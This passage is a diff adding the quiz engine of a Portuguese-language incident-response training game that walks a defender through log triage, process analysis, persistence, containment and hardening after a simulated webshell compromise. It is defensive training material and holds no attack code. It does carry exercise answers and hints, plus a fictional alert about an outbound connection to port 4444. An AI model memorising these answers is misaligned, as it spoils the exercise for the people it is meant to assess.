+  hint:'Uma das opções destrói a capacidade de investigar futuros incidentes; a outra viola o princípio do menor privilégio.',
+  explain:'Retenção curta de logs elimina evidências; rodar o Apache como root amplia drasticamente o impacto de um comprometimento. As demais medidas atacam vetor, persistência e detecção.'}
+];
+
+const PHASES = [
+  {n:1, title:'Triagem de Logs',   desc:'Analise o access.log do Apache e responda à triagem inicial do incidente.'},
+  {n:2, title:'Análise de Processos', desc:'Correlacione os processos em execução e identifique o que não pertence ao servidor.'},
+  {n:3, title:'Persistência',      desc:'Encontre e entenda os mecanismos de persistência instalados pelo atacante.'},
+  {n:4, title:'Contenção & Erradicação', desc:'Decida a ordem correta das ações de resposta e escreva a detecção.'},
+  {n:5, title:'Hardening',         desc:'Proponha medidas para impedir a recorrência deste ataque.'}
+];
+
+/* ================= estado ================= */
+const state = { startTime:null, endTime:null, score:0, solved:{}, attempts:{}, hints:{}, earned:{}, phaseSolved:{} };
+
+/* ================= construção da UI ================= */
+function buildNav(){
+  const nav = $('#nav');
+  nav.appendChild(el('div','nav-label','DIÁRIO DO INCIDENTE #IR-2025-0315'));
+  PHASES.forEach(p => {
+    const total = QUESTIONS.filter(q => q.phase === p.n).length;
+    const b = el('button','nav-item locked');
+    b.dataset.phase = p.n;
+    b.innerHTML = `<span class="nidx">FASE 0${p.n}</span><span>${p.title}</span><span class="nprog">0/${total}</span>`;
+    b.addEventListener('click', () => {
+      if (b.classList.contains('locked')) { toast('Conclua a fase anterior para desbloquear esta.','warn'); return; }
+      showPhase(p.n);
+    });
+    nav.appendChild(b);
+    if (p.n < 5) nav.appendChild(el('div','nav-sep'));
+  });
+  nav.appendChild(el('div','nav-info',
+    `Regras: primeiro acerto vale pontos integrais. Cada erro custa <b>−25%</b> do valor da questão; cada dica custa <b>−10%</b>.`));
+}
+
+function buildPhase(p){
+  const sec = el('section','phase'); sec.id = 'phase-' + p.n;
+  sec.innerHTML = `
+    <div class="phase-kicker">FASE 0${p.n}</div>
+    <h2>${p.title}</h2>
+    <p class="phase-desc">${p.desc}</p>
+    ${ARTIFACTS[p.n] || ''}`;
+  QUESTIONS.filter(q => q.phase === p.n).forEach(q => sec.appendChild(renderQuestion(q)));
+  const banner = el('div','done-banner hidden');
+  banner.id = 'banner-' + p.n;
+  if (p.n < 5) {
+    banner.innerHTML = `${ICON_CHECK}<span>FASE 0${p.n} CONCLUÍDA — acesso liberado.</span>`;
+    const btn = el('button','btn',`Ir para a Fase 0${p.n+1}`);
+    btn.addEventListener('click', () => showPhase(p.n+1));
+    banner.appendChild(btn);
+  } else {
+    banner.innerHTML = `${ICON_CHECK}<span>EXERCÍCIO CONCLUÍDO — compilando relatório…</span>`;
+  }
+  sec.appendChild(banner);
+  sec.appendChild(el('div','stamp','RESOLVIDO'));
+  $('#content').appendChild(sec);
+}
+
+function renderQuestion(q){
+  const wrap = el('div','q'); wrap.id = 'q-' + q.id;
+  wrap.appendChild(el('div','q-head',
+    `<span class="q-num">Q${q.id.slice(1)}</span><span class="q-prompt">${q.prompt}</span><span class="q-pts" id="pts-${q.id}">${q.pts} PTS</span>`));
+  const body = el('div','q-body');
+  if (q.type === 'mc')       buildMC(body, q, wrap);
+  if (q.type === 'text')     buildText(body, q, wrap);
+  if (q.type === 'classify') buildClassify(body, q, wrap);
+  if (q.type === 'order')    buildOrder(body, q, wrap);
+  if (q.type === 'multi')    buildMulti(body, q, wrap);
+  wrap.appendChild(body);
+
+  const foot = el('div','q-foot');
+  const hb = el('button','btn ghost warn','Pedir dica (−10%)');
+  hb.addEventListener('click', () => {
+    if (state.solved[q.id] || state.hints[q.id]) return;
+    state.hints[q.id] = true;
+    foot.parentNode.insertBefore(el('div','q-hintbox','<b>DICA:</b> ' + q.hint), foot);
+    hb.remove();
+    toast('Dica registrada — valor da questão reduzido em 10%.','warn');
+  });
+  foot.appendChild(hb);
+  foot.appendChild(el('span','attempts','TENTATIVAS: 0'));
+  wrap._attemptsEl = foot.querySelector('.attempts');
+  wrap.appendChild(foot);
+  wrap.appendChild(el('div','q-explain hidden','<b>ANÁLISE:</b> ' + q.explain));
+  return wrap;
+}
+
+/* ---------- construtores por tipo ---------- */
+function buildMC(body, q, wrap){
+  let sel = -1;
+  q.options.forEach((o,i) => {
+    const d = el('div','opt');
+    d.tabIndex = 0;
+    d.innerHTML = `<span class="opt-k">${String.fromCharCode(65+i)}</span><span class="opt-t">${o.t}</span>` +
+                  (o.code ? `<pre class="opt-code">${esc(o.code)}</pre>` : '');
+    const pick = () => {
+      if (state.solved[q.id]) return;
+      body.querySelectorAll('.opt').forEach(x => x.classList.remove('sel'));
+      d.classList.add('sel'); sel = i;
+    };
+    d.addEventListener('click', pick);
+    d.addEventListener('keydown', e => { if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); pick(); } });
+    body.appendChild(d);
+  });
+  const btn = el('button','btn','Confirmar');
+  btn.style.marginTop = '10px';
+  btn.addEventListener('click', () => {
+    if (sel < 0) { toast('Selecione uma opção antes de confirmar.','warn'); return; }
+    if (sel === q.answer) {
+      body.querySelectorAll('.opt')[sel].classList.add('good');
+      solve(q, wrap);
+    } else {
+      registerAttempt(q, wrap);
+      const d = body.querySelectorAll('.opt')[sel];
+      d.classList.add('bad');
+      setTimeout(() => d.classList.remove('bad'), 1000);
+      toast('Resposta incorreta — tente novamente.','err');
+    }
+  });
+  body.appendChild(btn);
+}
+
+function buildText(body, q, wrap){
+  const inp = el('input','tinput'); inp.placeholder = q.placeholder || ''; inp.autocomplete = 'off';
+  const btn = el('button','btn','Confirmar'); btn.style.marginLeft = '10px';
+  const check = () => {
+    if (!inp.value.trim()) { toast('Digite sua resposta.','warn'); return; }
+    const v = norm(inp.value);
+    if (q.match.some(m => v.includes(norm(m)))) { inp.readOnly = true; inp.classList.remove('bad'); solve(q, wrap); }
+    else { registerAttempt(q, wrap); inp.classList.add('bad'); setTimeout(() => inp.classList.remove('bad'), 900); toast('Resposta incorreta — tente novamente.','err'); }
+  };
+  btn.addEventListener('click', check);
+  inp.addEventListener('keydown', e => { if (e.key === 'Enter') check(); });
+  body.appendChild(inp); body.appendChild(btn);
+}
+
+function buildClassify(body, q, wrap){
+  const labels = ['—','LEGÍTIMO','MALICIOSO'];
+  const st = q.rows.map(() => 0);
+  q.rows.forEach((r,i) => {
+    const row = el('div','cls-row');
+    row.appendChild(el('div','cls-cmd',`<small>${r.user} · PID ${r.pid}</small>\n${r.cmd}`));
+    const b = el('button','cls-btn','—');
+    b.addEventListener('click', () => {
+      if (state.solved[q.id]) return;
+      body.querySelectorAll('.cls-btn').forEach(x => x.classList.remove('ok','bad'));
+      st[i] = (st[i] + 1) % 3;
+      b.textContent = labels[st[i]];
+      b.dataset.s = st[i];
+    });
+    row.appendChild(b);
+    body.appendChild(row);
+  });
+  const btn = el('button','btn','Verificar'); btn.style.marginTop = '10px';
+  btn.addEventListener('click', () => {
+    if (st.some(s => s === 0)) { toast('Classifique todos os processos.','warn'); return; }
+    const btns = body.querySelectorAll('.cls-btn');
+    let allOk = true;
+    q.rows.forEach((r,i) => {
+      const ok = (st[i] === 2) === r.mal;
+      if (!ok) allOk = false;
+      btns[i].classList.add(ok ? 'ok' : 'bad');
+    });
+    if (allOk) solve(q, wrap);
+    else { registerAttempt(q, wrap); toast('Há classificações erradas — veja os destaques.','err'); }
+  });
+  body.appendChild(btn);
+}
+
+function buildOrder(body, q, wrap){
+  const w = el('div','ord-wrap');
+  const pool = el('div'); const slotCol = el('div');
+  pool.appendChild(el('div','ord-col-t','AÇÕES DISPONÍVEIS'));
+  slotCol.appendChild(el('div','ord-col-t','SUA SEQUÊNCIA DE RESPOSTA'));
+  const chips = {}, slots = [];
+  const pick = q.items.map(() => null);
+  q.items.forEach(it => {
+    const c = el('div','pool-chip',`<span class="k">${it.k}</span><span>${it.t}</span>`);
+    c.addEventListener('click', () => {
+      if (state.solved[q.id]) return;
+      const i = pick.indexOf(null);
+      if (i < 0) { toast('Sequência completa — clique num slot para devolver.','warn'); return; }
+      pick[i] = it.k; chips[it.k].classList.add('used'); fillSlot(i);
+    });
+    chips[it.k] = c; pool.appendChild(c);
+  });
+  function fillSlot(i){
+    const s = slots[i], k = pick[i];
+    if (k) { s.classList.add('filled'); s.innerHTML = `<span class="k">${k}</span><span>${q.items.find(x => x.k === k).t}</span>`; }
+    else   { s.classList.remove('filled','ok','bad'); s.innerHTML = `<span class="sn">${i+1}.</span> clique numa ação…`; }
+  }
+  for (let i = 0; i < q.items.length; i++) {
+    const s = el('div','slot',`<span class="sn">${i+1}.</span> clique numa ação…`);
+    s.addEventListener('click', () => {
+      if (state.solved[q.id] || !pick[i]) return;
+      chips[pick[i]].classList.remove('used');
+      pick[i] = null; fillSlot(i);
+    });
+    slots.push(s); slotCol.appendChild(s);
+  }
+  w.appendChild(pool); w.appendChild(slotCol); body.appendChild(w);
+  const bar = el('div'); bar.style.cssText = 'display:flex;gap:10px;margin-top:12px';
+  const btn = el('button','btn','Verificar sequência');
+  const clr = el('button','btn ghost','Limpar');
+  clr.addEventListener('click', () => { if (state.solved[q.id]) return; pick.fill(null); q.items.forEach(it => chips[it.k].classList.remove('used')); slots.forEach((_,i) => fillSlot(i)); });
+  btn.addEventListener('click', () => {
+    if (pick.some(p => !p)) { toast('Preencha todas as posições antes de verificar.','warn'); return; }
+    const seq = pick.join('');
+    if (seq === q.correct) { slots.forEach(s => s.classList.add('ok')); solve(q, wrap); }
+    else {
+      registerAttempt(q, wrap);
+      q.correct.split('').forEach((ck,i) => slots[i].classList.add(pick[i] === ck ? 'ok' : 'bad'));
+      toast('Sequência incorreta — posições certas em verde.','err');
+    }
+  });
+  bar.appendChild(btn); bar.appendChild(clr); body.appendChild(bar);
+}
+
+function buildMulti(body, q, wrap){
+  const boxes = [];
+  q.options.forEach((o) => {
+    const l = el('label','mopt');
+    const cb = document.createElement('input'); cb.type = 'checkbox';
+    cb.addEventListener('change', () => body.querySelectorAll('.mopt').forEach(x => x.classList.remove('bad','miss')));
+    l.appendChild(cb); l.appendChild(el('span',null,o.t));
+    boxes.push({cb, ok:o.ok}); body.appendChild(l);
+  });
+  const btn = el('button','btn','Verificar'); btn.style.marginTop = '10px';
+  btn.addEventListener('click', () => {
+    let wrong = 0, missing = 0;
+    boxes.forEach((b,i) => {
+      const l = body.querySelectorAll('.mopt')[i];
+      l.classList.remove('bad','miss');
+      if (b.cb.checked && !b.ok) { wrong++;  l.classList.add('bad'); }
+      if (!b.cb.checked && b.ok) { missing++; l.classList.add('miss'); }
+    });
+    if (wrong === 0 && missing === 0) solve(q, wrap);
+    else { registerAttempt(q, wrap); toast(`Incompleto: faltam ${missing} correta(s) e há ${wrong} incorreta(s) marcada(s).`,'err'); }
+  });
+  body.appendChild(btn);
+}
+
+/* ================= pontuação / fases ================= */
+function registerAttempt(q, wrap){ state.attempts[q.id] = (state.attempts[q.id]||0) + 1; wrap._attemptsEl.textContent = 'TENTATIVAS: ' + state.attempts[q.id]; }
+
+function solve(q, wrap){
+  if (state.solved[q.id]) return;
+  state.solved[q.id] = true;
+  const att = state.attempts[q.id] || 0;
+  const factor = Math.max(0.25, Math.pow(0.75, att)) * (state.hints[q.id] ? 0.9 : 1);
+  const pts = Math.max(Math.ceil(q.pts * 0.25), Math.floor(q.pts * factor));
+  state.earned[q.id] = pts; state.score += pts;
+  wrap.classList.add('solved');
+  wrap.querySelector('.q-explain').classList.remove('hidden');
+  const chip = $('#pts-' + q.id);
+  chip.textContent = '+' + pts + ' PTS'; chip.classList.add('gain');
+  updateHUD(); updateNav();
+  toast(`Correto! +${pts} pontos.`);
+  checkPhase(q.phase);
+}
+
+function checkPhase(n){
+  const qs = QUESTIONS.filter(q => q.phase === n);
+  if (!qs.every(q => state.solved[q.id]) || state.phaseSolved[n]) return;
+  state.phaseSolved[n] = true;
+  const sec = $('#phase-' + n);
+  sec.classList.add('done');
+  $('#banner-' + n).classList.remove('hidden');
+  updateNav(); updateHUD();
+  if (n < 5) toast(`FASE 0${n} RESOLVIDA — próxima fase desbloqueada.`);
+  else { state.endTime = Date.now(); setTimeout(showReport, 1200); }
+}
+
+function phaseUnlocked(n){ return n === 1 || state.phaseSolved[n-1]; }
+
+function showPhase(n){
+  document.querySelectorAll('.phase').forEach(s => s.classList.remove('active'));
+  $('#phase-' + n).classList.add('active');
+  document.querySelectorAll('.nav-item').forEach(b => b.classList.toggle('active', +b.dataset.phase === n));
+  $('#content').scrollTop = 0;
+}
+
+function updateNav(){
+  document.querySelectorAll('.nav-item').forEach(b => {
+    const n = +b.dataset.phase;
+    const qs = QUESTIONS.filter(q => q.phase === n);
+    const done = qs.filter(q => state.solved[q.id]).length;
+    b.querySelector('.nprog').textContent = done + '/' + qs.length;
+    b.classList.toggle('locked', !phaseUnlocked(n));
+    b.classList.toggle('done', state.phaseSolved[n]);
+    if (state.phaseSolved[n]) b.querySelector('.nprog').textContent = 'OK';
+  });
+}
+
+function updateHUD(){
+  $('#hScore').textContent = String(state.score).padStart(3,'0') + '/100';
+  const solvedPhases = Object.keys(state.phaseSolved).length;
+  $('#hPhases').textContent = solvedPhases + '/5';
+}
+setInterval(() => {
+  if (!state.startTime) return;
+  const end = state.endTime || Date.now();
+  const s = Math.floor((end - state.startTime) / 1000);
+  $('#hClock').textContent = pad(Math.floor(s/60)) + ':' + pad(s%60);
+}, 500);
+
+/* ================= relatório final ================= */
+function rank(score){
+  if (score >= 90) return 'COMANDANTE DE INCIDENTE';
+  if (score >= 75) return 'ANALISTA SÊNIOR — TIER 3';
+  if (score >= 50) return 'ANALISTA — TIER 2';
+  return 'RECRUTA — CONTINUE TREINANDO';
+}
+function showReport(){
+  const s = Math.floor(((state.endTime||Date.now()) - state.startTime) / 1000);
+  const time = pad(Math.floor(s/60)) + ':' + pad(s%60);
+  $('#repScore').textContent = state.score + '/100';
+  $('#repTime').textContent = time;
+  $('#repRank').textContent = rank(state.score);
+  const tb = $('#repBody'); tb.innerHTML = '';
+  PHASES.forEach(p => {
+    const qs = QUESTIONS.filter(q => q.phase === p.n);
+    const got = qs.reduce((a,q) => a + (state.earned[q.id]||0), 0);
+    const max = qs.reduce((a,q) => a + q.pts, 0);
+    tb.appendChild(el('tr',null,`<td>FASE 0${p.n} — ${p.title}</td><td>${got} / ${max} pts</td>`));
+  });
+  $('#report').classList.add('show');
+}
+ $('#btnDownload').addEventListener('click', () => {
+  const lines = [
+    '==============================================',
+    ' RELATÓRIO DE EXERCÍCIO — OPERAÇÃO SILENT BREACH',
+    '==============================================',
+    'Data: ' + new Date().toLocaleString('pt-BR'),
+    'Pontuação final: ' + state.score + '/100',
+    'Classificação: ' + rank(state.score),
+    '',
+    '--- Detalhamento por fase ---'
+  ];
+  PHASES.forEach(p => {
+    const qs = QUESTIONS.filter(q => q.phase === p.n);
+    const got = qs.reduce((a,q) => a + (state.earned[q.id]||0), 0);
+    const max = qs.reduce((a,q) => a + q.pts, 0);
+    lines.push(`FASE 0${p.n} — ${p.title}: ${got}/${max} pts`);
+    qs.forEach(q => lines.push(`   ${q.id}: ${state.solved[q.id] ? state.earned[q.id] + ' pts' : 'nao resolvida'} (tentativas: ${state.attempts[q.id]||0}${state.hints[q.id] ? ', usou dica' : ''})`));
+  });
+  lines.push('', 'Gerado pelo simulador Silent Breach.');
+  const blob = new Blob([lines.join('\n')], {type:'text/plain;charset=utf-8'});
+  const a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = 'relatorio-silent-breach.txt';
+  a.click(); URL.revokeObjectURL(a.href);
+  toast('Relatório baixado.');
+});
+ $('#btnRestart').addEventListener('click', () => location.reload());
+
+/* ================= tooltip dos logs ================= */
+document.addEventListener('mousemove', e => {
+  const line = e.target.closest && e.target.closest('.logline');
+  const tip = $('#tip');
+  if (line && line.dataset.note) {
+    tip.style.display = 'block';
+    tip.textContent = line.dataset.note;
+    let x = e.clientX + 14, y = e.clientY + 16;
+    const r = tip.getBoundingClientRect();
+    if (x + r.width  > innerWidth  - 8) x = e.clientX - r.width - 12;
+    if (y + r.height > innerHeight - 8) y = e.clientY - r.height - 12;
+    tip.style.left = x + 'px'; tip.style.top = y + 'px';
+  } else tip.style.display = 'none';
+});
+
+/* ================= sequência de alerta (intro) ================= */
+const INTRO = [
+  ['> SIEM-CORE v4.2 — canal de alertas conectado', ''],
+  ['[03:47:12] SEVERITY=CRITICAL  rule=90032  webshell_detected', 'crit'],
+  ['[03:47:12] host=WEB-PROD-01 (10.0.5.20)  svc=apache2', ''],
+  ['[03:47:13] anomalia: conexao de saida 10.0.5.20 -> 185.220.x.x:4444', 'crit'],
+  ['[03:47:14] classificacao automatica: COMPROMETIMENTO CONFIRMADO', 'crit'],
+  ['[03:47:15] atribuindo caso ao analista de plantao...', 'ok']
+];
+let introDone = false;
+async function runIntro(){
+  const box = $('#introLines');
+  const cursor = el('span','cur');
+  for (const [txt, cls] of INTRO) {
+    if (introDone) break;
+    const line = el('div', cls || null); box.appendChild(line); line.appendChild(cursor);
+    for (const ch of txt) {
+      if (introDone) break;
+      cursor.insertAdjacentText('beforebegin', ch);
+      await new Promise(r => setTimeout(r, 13));
+    }
+    await new Promise(r => setTimeout(r, 300));
+  }
+  if (!introDone) $('#introFoot').classList.add('show');
+}
+ $('#intro').addEventListener('click', () => {
+  if (!introDone) { introDone = true; $('#introFoot').classList.add('show'); }
+});
+ $('#btnAccept').addEventListener('click', e => {
+  e.stopPropagation();
+  introDone = true;
+  $('#intro').classList.add('hide');
+  document.body.classList.add('ready');
+  state.startTime = Date.now();
+  showPhase(1);
+  setTimeout(() => $('#intro').remove(), 600);
+  toast('Incidente #IR-2025-0315 assumido — cronômetro iniciado.');
+});
+
+/* ================= inicialização ================= */
+buildNav();
+PHASES.forEach(buildPhase);
+updateNav(); updateHUD();
+runIntro();
+</script>
+</body>
+</html>
